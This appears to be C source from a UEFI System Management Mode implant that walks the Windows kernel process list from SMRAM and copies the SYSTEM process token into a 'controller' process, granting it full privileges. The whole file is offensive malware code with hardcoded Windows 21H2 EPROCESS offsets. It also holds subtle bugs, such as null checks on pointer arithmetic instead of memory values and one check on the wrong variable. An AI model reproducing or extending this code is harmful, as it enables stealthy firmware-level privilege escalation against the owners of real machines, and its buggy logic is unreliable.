#include <Uefi.h>

#include "Globals.h"
#include "Defs.h"
#include "Utils.h"
#include "Serial.h"
#include "Memory.h"

#define NT_SYSTEM_PID 4

/// \note @0x00Alchemist: EPROCESS 21H2+ offsets
#define EPROCESS_DIRBASE_OFFSET              0x28
#define EPROCESS_UNIQUE_PROCESS_ID_OFFSET    0x440
#define EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET 0x448
#define EPROCESS_TOKEN_OFFSET                0x4B8


/**
 * \brief Gets the dir base of a particular process by searching for 
 * the PID among all running processes
 * 
 * \param ProcessId      Target PID
 * \param SysEprocess    Mapped into SMRAM system EPROCESS
 * \param SysDir         Dir base of the system
 * \param TargetEprocess Pointer on physical address of unmapped EPROCESS if requested
 * 
 * \returns Dir Base of the target process or 0, if process not found 
 */
UINT64
EFIAPI
NtGetDirBaseByPid(
	IN  UINT64   ProcessId,
	IN  VOID    *SysEprocess,
	IN  UINT64   SysDir,
	OUT VOID   **TargetEprocess OPTIONAL
) {
	UINT64 CurrentEprocess;
	UINT64 NextEprocess;
	UINT64 TargetDirBase;

	TargetDirBase = 0;
	CurrentEprocess = SysEprocess;

	/// \todo @0x00Alchemist: looks wrong, need to rewrite
	while(TRUE) {
		if(((UINT8 *)CurrentEprocess + EPROCESS_DIRBASE_OFFSET) == 0 || ((UINT8 *)CurrentEprocess + EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET) == 0)
			break;

		// get next EPROCESS entry
		NextEprocess = *(UINT64 *)((UINT8 *)CurrentEprocess + EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET);

		MemRestoreSmramMappings();

		// translate entry
		VOID *Unmapped = NULL;
		CurrentEprocess = MemMapVirtualAddress((VOID *)(NextEprocess - EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET), SysDir, &Unmapped);
		if(CurrentEprocess != 0) {
			// check if it's requested process
			if(*(UINT64 *)((UINT8 *)CurrentEprocess + EPROCESS_UNIQUE_PROCESS_ID_OFFSET) == ProcessId) {
				if(TargetEprocess != NULL)
					*TargetEprocess = Unmapped;

				TargetDirBase = *(UINT64 *)((UINT8 *)CurrentEprocess + EPROCESS_DIRBASE_OFFSET);

				SerialPrint("[ SMM ] Process located\r\n");

				break;
			}
		} else {
			break;
		}
	}

	MemRestoreSmramMappings();

	return TargetDirBase;
}

/**
 * \brief Changes token of controller process
 * 
 * \param SysEprocess        Unmapped address of physical system EPROCESS
 * \param ControllerEprocess Unmapped address of physical controller EPROCESS
 * 
 * \return EFI_SUCCESS - Succesfully changed process token
 * \return EFI_ABORTED - Unable to map system or controller EPROCESS into SMRAM
 */
EFI_STATUS
EFIAPI
NtExchangeProcessToken(
	IN UINT64 SysEprocess,
	IN UINT64 ControllerEprocess
) {
	// map system EPROCESS
	UINT64 SysMapped = MemProcessOutsideSmramPhysMemory(SysEprocess);
	if(SysMapped != 0) {
		// check if token valid
		if(((UINT8 *)SysMapped + EPROCESS_TOKEN_OFFSET) == 0) {
			SerialPrint("[ SMM ] Invalid system token\r\n");
			return EFI_ABORTED;
		}

		UINT64 SysToken = *(UINT64 *)((UINT8 *)SysMapped + EPROCESS_TOKEN_OFFSET);
		
		MemRestoreSmramMappings();

		// map controller EPROCESS
		UINT64 ControllerMapped = MemProcessOutsideSmramPhysMemory(ControllerEprocess);
		if(ControllerEprocess == 0) {
			SerialPrint("[ SMM ] Unable to map controller EPROCESS into SMRAM\r\n");
			return EFI_ABORTED;
		}

		// copy token
		PhysMemCpy(((UINT8 *)ControllerMapped + EPROCESS_TOKEN_OFFSET), &SysToken, sizeof(UINT64));
	} else {
		SerialPrint("[ SMM ] Unable to map system EPROCESS into SMRAM\r\n");
		return EFI_ABORTED;
	}

	MemRestoreSmramMappings();

	return EFI_SUCCESS;
}
